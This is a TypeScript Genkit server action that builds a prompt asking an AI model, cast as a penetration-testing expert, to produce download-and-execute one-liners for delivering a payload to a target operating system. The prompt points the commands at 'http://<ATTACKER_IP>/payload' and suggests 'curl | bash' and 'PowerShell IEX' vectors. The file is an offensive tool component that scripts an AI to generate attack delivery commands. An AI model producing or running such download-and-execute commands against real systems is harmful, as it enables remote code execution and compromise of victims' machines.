'use server';

/**
 * @fileOverview Generates payload delivery vectors.
 *
 * - generateDeliveryVectors - A function that creates one-liner delivery commands.
 * - GenerateDeliveryVectorsInput - The input type for the function.
 * - GenerateDeliveryVectorsOutput - The return type for the function.
 */

import {ai} from '@/ai/genkit';
import {z} from 'genkit';

const GenerateDeliveryVectorsInputSchema = z.object({
  payloadScript: z.string().describe('The payload script to be delivered.'),
  os: z.string().describe('The target operating system (e.g., Linux, Windows).'),
});
export type GenerateDeliveryVectorsInput = z.infer<typeof GenerateDeliveryVectorsInputSchema>;

const GenerateDeliveryVectorsOutputSchema = z.object({
  vectors: z
    .array(
      z.object({
        name: z.string().describe('The name of the delivery vector (e.g., "PowerShell IEX Download").'),
        command: z.string().describe('The one-liner command to execute the payload.'),
      })
    )
    .describe('A list of potential delivery vectors.'),
});
export type GenerateDeliveryVectorsOutput = z.infer<typeof GenerateDeliveryVectorsOutputSchema>;

export async function generateDeliveryVectors(
  input: GenerateDeliveryVectorsInput
): Promise<GenerateDeliveryVectorsOutput> {
  return deliveryVectorFlow(input);
}

const prompt = ai.definePrompt({
  name: 'generateDeliveryVectorsPrompt',
  input: {schema: GenerateDeliveryVectorsInputSchema},
  output: {schema: GenerateDeliveryVectorsOutputSchema},
  prompt: `You are a penetration testing expert. Your task is to provide common one-liner commands to download and execute a payload on a target system.

    Target OS: {{{os}}}
    Payload Script (for context, do not include in output):
    \`\`\`
    {{{payloadScript}}}
    \`\`\`

    Based on the Target OS, generate a list of 2-3 common and effective delivery vectors.
    For each vector, provide a concise name and the full command.
    The command should assume the payload is hosted at 'http://<ATTACKER_IP>/payload'. You MUST use '<ATTACKER_IP>' as a placeholder for the user to fill in.
    For example, for a Linux target, you might suggest a 'curl | bash' vector.
    For a Windows target, you might suggest a 'PowerShell IEX' vector.
    `,
});

const deliveryVectorFlow = ai.defineFlow(
  {
    name: 'deliveryVectorFlow',
    inputSchema: GenerateDeliveryVectorsInputSchema,
    outputSchema: GenerateDeliveryVectorsOutputSchema,
  },
  async input => {
    const {output} = await prompt(input);
    return output!;
  }
);
